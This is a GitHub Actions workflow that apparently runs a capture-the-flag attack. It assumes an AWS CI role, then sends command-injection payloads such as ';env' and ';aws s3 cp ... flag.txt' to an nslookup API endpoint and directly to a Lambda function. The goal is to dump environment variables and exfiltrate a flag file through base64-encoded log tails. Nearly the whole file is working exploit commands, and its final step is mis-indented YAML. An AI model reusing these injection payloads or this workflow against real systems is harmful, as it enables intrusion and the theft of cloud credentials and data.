name: deploy
on:
  push:
    branches:
      - corgi
jobs:
  aws:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Get AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: AWS identity
        run: aws sts get-caller-identity

      - name: Try direct flag read with cicdRole first (cheap check)
        run: |
          aws s3 cp s3://codec4f26c862a321ef5/flag.txt - || echo "cicdRole cannot read flag.txt directly"

      - name: Trigger nslookup injection (no space needed before ;)
        run: |
          echo "===== injection: env ====="
          curl -s -i -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" \
            -d '{"domain":";env"}'
          echo
          echo "===== injection: try reading flag via lambdaRole, write to /tmp ====="
          curl -s -i -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" \
            -d '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt --region us-east-1"}'
          echo
          echo "===== injection: aws s3 ls to confirm command execution works at all ====="
          curl -s -i -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" \
            -d '{"domain":";aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1"}'

      - name: Wait a moment for async log delivery
        run: sleep 5

      - name: Invoke Lambda directly, bypassing API Gateway
        run: |
          echo "===== direct invoke: benign domain ====="
          aws lambda invoke --function-name nslookupv2 \
            --payload '{"domain":"example.com"}' \
            --cli-binary-format raw-in-base64-out \
            out1.json || echo "direct invoke denied"
          cat out1.json 2>/dev/null || true
          echo
          echo "===== direct invoke: injection env ====="
          aws lambda invoke --function-name nslookupv2 \
            --payload '{"domain":";env"}' \
            --cli-binary-format raw-in-base64-out \
            out2.json || true
          cat out2.json 2>/dev/null || true
          echo
          echo "===== direct invoke: injection s3 read flag to /tmp then base64 to logs ====="
          aws lambda invoke --function-name nslookupv2 \
            --payload '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/f.txt --region us-east-1 && base64 /tmp/f.txt"}' \
            --cli-binary-format raw-in-base64-out \
            out3.json || true
          cat out3.json 2>/dev/null || true

      - name: Inspect API Gateway integration (mapping templates)
        run: |
          API_ID="3q931syi7b"
          echo "===== resources ====="
          aws apigateway get-resources --rest-api-id "$API_ID" || echo "denied"
          echo "===== stages ====="
          aws apigateway get-stages --rest-api-id "$API_ID" || echo "denied"
          
          
          - name: Direct invoke with inline log tail (no CloudWatch perms needed)
        run: |
          aws lambda invoke --function-name nslookupv2 \
            --payload '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/f.txt --region us-east-1 && cat /tmp/f.txt"}' \
            --cli-binary-format raw-in-base64-out \
            --log-type Tail \
            --query 'LogResult' --output text out4.txt || true
          echo "===== decoded tail log ====="
          cat out4.txt | base64 -d || true
